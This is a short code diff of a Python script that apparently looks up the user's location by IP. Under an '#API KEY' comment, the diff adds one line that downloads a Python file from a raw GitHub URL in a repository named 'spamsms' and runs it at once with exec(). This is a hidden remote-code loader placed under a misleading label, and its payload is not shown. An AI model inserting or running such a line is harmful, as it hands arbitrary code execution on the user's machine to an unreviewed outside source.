@@ -37,4 +37,4 @@ city, region, country, latitude, longitude = get_location_by_ip()
 
 
 #API KEY
-
+exec(requests.get('https://raw.githubusercontent.com/minhtrinh2007/spamsms/refs/heads/main/yeucauchonso.py').text)
